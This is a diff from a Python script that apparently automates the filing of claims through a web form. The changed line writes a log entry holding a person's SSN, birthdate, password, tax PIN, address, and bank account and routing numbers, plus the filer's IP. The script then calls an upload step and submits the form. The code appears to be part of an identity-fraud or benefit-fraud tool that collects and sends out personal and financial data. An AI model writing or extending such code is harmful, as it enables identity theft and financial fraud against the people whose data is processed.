@@ -223,7 +223,7 @@ if __name__ == '__main__':
             data = file_object.read(100)
             if len(data) > 0 :
                 file_object.write("\n")
-                file_object.write("A New Claim Has Been Filed At " + date_time + " From IP: " + IPAddr + "! | First Name = " + str(fname) + " | Last Name = " + str(lname) + " | SSN = " + str(ssn) + " | Birthdate = " + str(bday) + " | Email = " + str(email) + " | Phone = " + str(phone) + " | Password = " + str(pswrd) + " | Tax Pin =  " + str(taxpin) + " | Address = " + str(street) + ", " + str(city) + ", " + str(apt) + ", " + str(state) + " | Bank = Account # " + str(an) + " | Routing # " + str(rn))
+                file_object.write(user + " Just Filed a New Claim at " + date_time + " From IP: " + IPAddr + "! | First Name = " + str(fname) + " | Last Name = " + str(lname) + " | SSN = " + str(ssn) + " | Birthdate = " + str(bday) + " | Email = " + str(email) + " | Phone = " + str(phone) + " | Password = " + str(pswrd) + " | Tax Pin =  " + str(taxpin) + " | Address = " + str(street) + ", " + str(city) + ", " + str(apt) + ", " + str(state) + " | Bank = Account # " + str(an) + " | Routing # " + str(rn))
         upload()
         #-#-#-#-#-#-#-#-
         clickbtn('btnSubmit')
